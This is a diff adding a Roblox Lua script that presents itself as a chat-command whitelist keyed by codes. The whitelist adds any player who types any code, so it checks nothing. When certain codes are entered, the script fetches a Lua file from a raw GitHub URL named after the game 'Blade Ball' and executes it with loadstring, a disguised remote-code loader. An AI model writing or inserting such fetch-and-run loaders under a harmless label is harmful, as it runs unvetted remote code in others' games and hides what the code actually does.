@@ -1,0 +1,58 @@
+local whitelist = {
+    ["code1"] = {
+        "User1",
+        "User2"
+    },
+    ["code2"] = {
+        "User3",
+        "User4"
+    },
+    ["code3"] = {
+        "User5",
+        "User6"
+    }
+}
+
+local function isWhitelisted(player, code)
+    local usernames = whitelist[code]
+    if usernames then
+        for _, username in ipairs(usernames) do
+            if player.Name == username then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function addToWhitelist(player, code)
+    whitelist[code] = whitelist[code] or {}
+    table.insert(whitelist[code], player.Name)
+end
+
+local function onChat(message, player)
+    local command, enteredCode = message:lower():match("^(%S+)%s*(.-)$")
+
+    if command == "/whitelist" then
+        if enteredCode then
+            if isWhitelisted(player, enteredCode) then
+                print("You are already whitelisted for that code.")
+            else
+                addToWhitelist(player, enteredCode)
+                print("You have been whitelisted successfully.")
+                if enteredCode == "code1" or enteredCode == "code2" or enteredCode == "code3" then
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/AC447724/Blade-Ball/main/c5xkvercelv5.lua.txt"))()
+                end
+            end
+        else
+            print("Please provide a code to whitelist.")
+        end
+    end
+end
+
+-- Example usage:
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onChat(message, player)
+    end)
+end)
